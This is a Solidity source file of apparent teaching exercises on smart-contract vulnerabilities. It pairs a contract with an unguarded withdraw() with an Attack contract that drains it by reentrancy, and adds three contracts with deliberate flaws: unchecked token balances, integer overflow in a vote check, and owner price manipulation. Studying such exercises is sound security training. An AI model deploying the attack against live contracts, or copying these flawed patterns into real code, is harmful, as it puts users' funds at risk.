pragma solidity 0.4.23;

contract Vulnerablitity {
    function getBalance(address _account) public view returns (uint256) {
        return address(_account).balance;
    }
    
    function() external payable {}
    
    function withdraw() public returns (bool) {
        return msg.sender.call.value(1e18)();   
    }
}

contract Attack {
    Vulnerablitity v;
    constructor(address _contractAddr) public {
        v = Vulnerablitity(_contractAddr);
    }
    
    function attackContract() public {
        v.withdraw();
    }
    
    function() external payable {
        v.withdraw();
    }
}

//*** Exercice 2 ***//
contract SimpleToken{
    mapping(address => uint) public balances;
    
    function buyToken() payable {
        balances[msg.sender] += msg.value / 1 ether;
    }

    function sendToken(address _recipient, uint _amount) {
        require(balances[msg.sender]!=0); // You must have some tokens.
        
        balances[msg.sender]-=_amount;
        balances[_recipient]+=_amount;
    }  
}

//*** Exercice 3 ***//
contract VoteTwoChoices{
    mapping(address => uint) public votingRights;
    mapping(address => uint) public votesCast;
    mapping(bytes32 => uint) public votesReceived;
    
    function buyVotingRights() payable {
        votingRights[msg.sender]+=msg.value/(1 ether);
    }
    
    function vote(uint _nbVotes, bytes32 _proposition) {
        require(_nbVotes + votesCast[msg.sender]<=votingRights[msg.sender]); // Check you have enough voting rights.
        
        votesCast[msg.sender]+=_nbVotes;
        votesReceived[_proposition]+=_nbVotes;
    }
}

//*** Exercice 4 ***//
contract BuyToken {
    mapping(address => uint) public balances;
    uint public price=1;
    address public owner=msg.sender;
    
    function buyToken(uint _amount, uint _price) payable {
        require(_price>=price);
        require(_price * _amount * 1 ether <= msg.value);
        balances[msg.sender]+=_amount;
    }
    
    function setPrice(uint _price) {
        require(msg.sender==owner);
        
        price=_price;
    }
}
